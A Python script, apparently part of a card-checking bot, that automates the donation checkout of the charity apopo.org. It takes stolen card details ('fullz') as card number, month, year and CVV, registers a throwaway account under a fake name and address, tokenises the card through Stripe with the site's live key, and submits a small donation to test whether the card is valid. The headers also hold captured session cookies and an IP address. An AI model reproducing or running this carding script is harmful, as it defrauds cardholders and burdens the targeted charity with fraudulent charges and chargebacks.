import asyncio
import random
from fake_useragent import UserAgent
import requests
from FUNC.defs import *
import re
from bs4 import BeautifulSoup



session = requests.session()
        
def gets(s, start, end):
            try:
                start_index = s.index(start) + len(start)
                end_index = s.index(end, start_index)
                return s[start_index:end_index]
            except ValueError:
                return None



async def create_cvv_charge(fullz , session):
    try:
        cc , mes , ano , cvv = fullz.split("|")


        session =requests.Session()
        email="craish"+str(random.randint(548,98698))+"niki@gmail.com"

        headers = {
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            # 'cookie': 'poptin_old_user=true; poptin_user_id=0.i8wdmi7vgco; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-08-01%2005%3A41%3A31%7C%7C%7Cep%3Dhttps%3A%2F%2Fapopo.org%2Fsupport-us%2Fdonate%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-08-01%2005%3A41%3A31%7C%7C%7Cep%3Dhttps%3A%2F%2Fapopo.org%2Fsupport-us%2Fdonate%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F127.0.0.0%20Safari%2F537.36; tk_or=%22%22; tk_r3d=%22%22; tk_lr=%22%22; cookielawinfo-checkbox-necessary=yes; poptin_user_ip=103.42.228.16; poptin_user_country_code=BD; poptin_session_account_d3457fd6feab2=true; poptin_session=true; poptin_c_visitor=true; cookielawinfo-checkbox-functional=yes; cookielawinfo-checkbox-performance=yes; cookielawinfo-checkbox-analytics=yes; cookielawinfo-checkbox-advertisement=yes; cookielawinfo-checkbox-others=yes; viewed_cookie_policy=yes; cli_user_preference=en-cli-yes-checkbox-necessary-yes-checkbox-functional-yes-checkbox-performance-yes-checkbox-analytics-yes-checkbox-advertisement-yes-checkbox-others-yes; CookieLawInfoConsent=eyJ2ZXIiOiIxIiwibmVjZXNzYXJ5IjoidHJ1ZSIsImZ1bmN0aW9uYWwiOiJ0cnVlIiwicGVyZm9ybWFuY2UiOiJ0cnVlIiwiYW5hbHl0aWNzIjoidHJ1ZSIsImFkdmVydGlzZW1lbnQiOiJ0cnVlIiwib3RoZXJzIjoidHJ1ZSJ9; PHPSESSID=684oud5cdfhte8idhguisdvl63; poptin_referrer=apopo.org/support-us/donate/; poptin_referrer_protocol=secure; poptin_previous_url=apopo.org/support-us/donate/; poptin_previous_url_protocol=secure; sbjs_session=pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fapopo.org%2Fsupport-us%2Fdonate%2F; _gcl_au=1.1.1410586145.1722490928; _ga_TJ8958P41M=GS1.1.1722490928.1.0.1722490928.60.0.1208583471; _fbp=fb.1.1722490928638.235833839734692170; _hp2_id.678943527=%7B%22userId%22%3A%227316782208757187%22%2C%22pageviewId%22%3A%221725185251648067%22%2C%22sessionId%22%3A%223733984567218790%22%2C%22identity%22%3Anull%2C%22trackerVersion%22%3A%224.0%22%7D; _ga=GA1.2.788692514.1722490928; _gid=GA1.2.1982788603.1722490931; _gat_gtag_UA_131394_12=1; _hp2_ses_props.678943527=%7B%22r%22%3A%22https%3A%2F%2Fapopo.org%2Fsupport-us%2Fdonate%2F%22%2C%22ts%22%3A1722490930654%2C%22d%22%3A%22apopo.org%22%2C%22h%22%3A%22%2Fsupport-us%2Fdonate%2F%22%7D',
            'origin': 'https://apopo.org',
            'priority': 'u=1, i',
            'referer': 'https://apopo.org/support-us/donate/',
            'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }

        data = {
            'action': 'donation_to_order',
            'nonce': '38fe1aafbb',
            'campaign_id': '117156',
            'amount': '5',
            'type': 'shortcode',
            'tribute': '',
            'gift_aid': '',
            'is_recurring': 'no',
            'new_period': 'time',
            'new_length': '1',
            'new_interval': '1',
        }

        response = session.post('https://apopo.org/wp-admin/admin-ajax.php', headers=headers, data=data)

        response = str(response.cookies)
        ses= gets(response, "wp_woocommerce_session_96889eaee3736bffc79a6c524a62fa7b", " ")
        hash= gets(response, "woocommerce_cart_hash=", " ")

        # print(ses)
        # print(hash)

        response = session.get('https://apopo.org/checkout/',)

        response = session.get('https://apopo.org/my-account/?redirect_to_checkout',)


        data = {
            'xoo_el_reg_email': email,
            'xoo_el_reg_fname': 'Crish',
            'xoo_el_reg_lname': 'Niki',
            'xoo_el_reg_pass': 'ixjj9EkEe5KhRtS',
            'xoo_el_reg_pass_again': 'ixjj9EkEe5KhRtS',
            '_xoo_el_form': 'register',
            'xoo_el_redirect': '/my-account/?redirect_to_checkout',
            'action': 'xoo_el_form_action',
            'display': 'inline',
        }

        response = session.post('https://apopo.org/wp-admin/admin-ajax.php', headers=headers, data=data)

        response = session.get('https://apopo.org/checkout/', headers=headers)

        nonce= gets(response.text, '"woocommerce-process-checkout-nonce" value="', '"')

        # print(nonce)



        data={
        'billing_details[name]':'Crish Niki',
        'billing_details[email]':email,
        'billing_details[address][city]':'Wakefield',
        'billing_details[address][country]':'GB',
        'billing_details[address][line1]':'2 Wentworth Terrace',
        'billing_details[address][postal_code]':'WF1 3QN',
        'type':'card',
        'card[number]':cc,
        'card[cvc]':cvv,
        'card[exp_year]':ano,
        'card[exp_month]':mes,
        'allow_redisplay':'unspecified',
        'pasted_fields':'number',
        'payment_user_agent':'stripe.js/e811bc65bb; stripe-js-v3/e811bc65bb; payment-element; deferred-intent',
        'referrer':'https://apopo.org',
        'time_on_page':'20998',
        'client_attribution_metadata[client_session_id]':'009ba205-1119-4e86-9228-662e344e8fb2',
        'client_attribution_metadata[merchant_integration_source]':'elements',
        'client_attribution_metadata[merchant_integration_subtype]':'payment-element',
        'client_attribution_metadata[merchant_integration_version]':'2021',
        'client_attribution_metadata[payment_intent_creation_flow]':'deferred',
        'client_attribution_metadata[payment_method_selection_flow]':'merchant_specified',
        'guid':'NA',
        'muid':'NA',
        'sid':'NA',
        'key':'pk_live_51L584MFU55iuj2oY1mY2nu6jfwPY5YIJDXMgasFZTQBLDtmUOn8P4FIBHLtIOh549Ltfs66KMvsTyqDvkBM5Utnv00VYfKIins',
        }
        response = session.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)

        print(response.text)

        id= response.json()['id']
            # print(id)


        # headers = {
        #     'accept': 'application/json, text/javascript, */*; q=0.01',
        #     'accept-language': 'en-US,en;q=0.9',
        #     'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        #     'cookie': f'poptin_old_user=true; poptin_user_id=0.i8wdmi7vgco; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-08-01%2005%3A41%3A31%7C%7C%7Cep%3Dhttps%3A%2F%2Fapopo.org%2Fsupport-us%2Fdonate%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-08-01%2005%3A41%3A31%7C%7C%7Cep%3Dhttps%3A%2F%2Fapopo.org%2Fsupport-us%2Fdonate%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F127.0.0.0%20Safari%2F537.36; tk_or=%22%22; tk_r3d=%22%22; tk_lr=%22%22; cookielawinfo-checkbox-necessary=yes; poptin_user_ip=103.42.228.16; poptin_user_country_code=BD; poptin_session_account_d3457fd6feab2=true; poptin_session=true; poptin_c_visitor=true; cookielawinfo-checkbox-functional=yes; cookielawinfo-checkbox-performance=yes; cookielawinfo-checkbox-analytics=yes; cookielawinfo-checkbox-advertisement=yes; cookielawinfo-checkbox-others=yes; viewed_cookie_policy=yes; cli_user_preference=en-cli-yes-checkbox-necessary-yes-checkbox-functional-yes-checkbox-performance-yes-checkbox-analytics-yes-checkbox-advertisement-yes-checkbox-others-yes; CookieLawInfoConsent=eyJ2ZXIiOiIxIiwibmVjZXNzYXJ5IjoidHJ1ZSIsImZ1bmN0aW9uYWwiOiJ0cnVlIiwicGVyZm9ybWFuY2UiOiJ0cnVlIiwiYW5hbHl0aWNzIjoidHJ1ZSIsImFkdmVydGlzZW1lbnQiOiJ0cnVlIiwib3RoZXJzIjoidHJ1ZSJ9; PHPSESSID=684oud5cdfhte8idhguisdvl63; poptin_referrer_protocol=secure; _gcl_au=1.1.1410586145.1722490928; _fbp=fb.1.1722490928638.235833839734692170; _gid=GA1.2.1982788603.1722490931; _hp2_ses_props.678943527=%7B%22r%22%3A%22https%3A%2F%2Fapopo.org%2Fsupport-us%2Fdonate%2F%22%2C%22ts%22%3A1722490930654%2C%22d%22%3A%22apopo.org%22%2C%22h%22%3A%22%2Fsupport-us%2Fdonate%2F%22%7D; woocommerce_items_in_cart=1; woocommerce_cart_hash={hash}; mailchimp_landing_site=https%3A%2F%2Fapopo.org%2Fcheckout%2F; wcf_active_checkout=123881; cartflows_session_115751=115751_6ae3ec3b56d500d167a9580fbe3b6883; wordpress_logged_in_96889eaee3736bffc79a6c524a62fa7b=crish.niki%7C1723701050%7CMyBPucMadGbb98gxo5YHxmTBhyyTAbD3hIrjpKeTZ1y%7C58c53fe457dc6b2d90b7408423c541cff594d105828ef9093cd97e52a7d16fd6; wp_woocommerce_session_96889eaee3736bffc79a6c524a62fa7b={ses}; wfwaf-authcookie-295391d14ca809aab14e7c00f7c946b8=37464%7Cother%7Cread%7C3de72eb7f2d5d57501766513f7ccd7fdb284698343b3bb6f6330f6cf8da900d1; wcf-visited-flow-115751=%5B123881%5D; tk_ai=hGugZmgZ27Bj8C3GNgZKLjKa; _hjSessionUser_3165221=eyJpZCI6IjZmZmZlZGQ3LTU4ZGItNTNkZi05ZjVhLTgzMjg5MDIwMzg1YiIsImNyZWF0ZWQiOjE3MjI0OTE1MjI1MzEsImV4aXN0aW5nIjp0cnVlfQ==; _hjSession_3165221=eyJpZCI6ImNlMmQwY2U5LTgwNzMtNGRiYy1iODJhLTU4ZjcxNDNmNzg1OSIsImMiOjE3MjI0OTE1MjI1MzQsInMiOjEsInIiOjEsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjoxLCJzcCI6MH0=; poptin_referrer=apopo.org/checkout/; poptin_previous_url=apopo.org/checkout/; poptin_previous_url_protocol=secure; sbjs_session=pgs%3D8%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fapopo.org%2Fcheckout%2F; _ga=GA1.2.788692514.1722490928; _gat_gtag_UA_131394_12=1; tk_qs=; wcf-step-visited-115751=%7B%22123881%22%3A%7B%22control_step_id%22%3A123881%2C%22current_step_id%22%3A123881%2C%22step_type%22%3A%22checkout%22%2C%22visit_id%22%3A23407%2C%22conversion%22%3A%22no%22%7D%7D; _hp2_id.678943527=%7B%22userId%22%3A%227316782208757187%22%2C%22pageviewId%22%3A%228099034631264979%22%2C%22sessionId%22%3A%223733984567218790%22%2C%22identity%22%3Anull%2C%22trackerVersion%22%3A%224.0%22%7D; _ga_TJ8958P41M=GS1.1.1722490928.1.1.1722491630.29.0.1208583471',
        #     'origin': 'https://apopo.org',
        #     'priority': 'u=1, i',
        #     'referer': 'https://apopo.org/checkout/',
        #     'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
        #     'sec-ch-ua-mobile': '?0',
        #     'sec-ch-ua-platform': '"Windows"',
        #     'sec-fetch-dest': 'empty',
        #     'sec-fetch-mode': 'cors',
        #     'sec-fetch-site': 'same-origin',
        #     'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
        #     'x-requested-with': 'XMLHttpRequest',
        # }

        params = {
            'wc-ajax': 'checkout',
            'wcf_checkout_id': '123881',
            'elementor_page_id': '10',
        }

        data={
            'billing_email':email,
            'billing_first_name':'Crish',
            'billing_last_name':'Niki',
            'billing_country':'GB',
            'billing_address_1':'2 Wentworth Terrace',
            'billing_city':'Wakefield',
            'billing_postcode':'WF1 3QN',
            'mailchimp_woocommerce_newsletter':'1',
            '_wcf_flow_id':'115751',
            '_wcf_checkout_id':'123881',
            'wc_order_attribution_source_type':'typein',
            'wc_order_attribution_referrer':'(none)',
            'wc_order_attribution_utm_campaign':'(none)',
            'wc_order_attribution_utm_source':'(direct)',
            'wc_order_attribution_utm_medium':'(none)',
            'wc_order_attribution_utm_content':'(none)',
            'wc_order_attribution_utm_id':'(none)',
            'wc_order_attribution_utm_term':'(none)',
            'wc_order_attribution_session_entry':'https://apopo.org/support-us/donate/',
            'wc_order_attribution_session_start_time':'2024-08-01 05:41:31',
            'wc_order_attribution_session_pages':'8',
            'wc_order_attribution_session_count':'1',
            'wc_order_attribution_user_agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
            'payment_method':'stripe',
            'wc-stripe-is-deferred-intent':'1',
            'terms':'on',
            'terms-field':'1',
            'woocommerce-process-checkout-nonce':nonce,
            '_wp_http_referer':'/checkout/?wc-ajax=update_order_review&wcf_checkout_id=123881&elementor_page_id=10',
            'wc-stripe-payment-method':id
            }
        response = session.post('https://apopo.org/',headers=headers, params=params,  data=data)

        print(response.text)
        return response

    except Exception as e:
        return str(e)
    



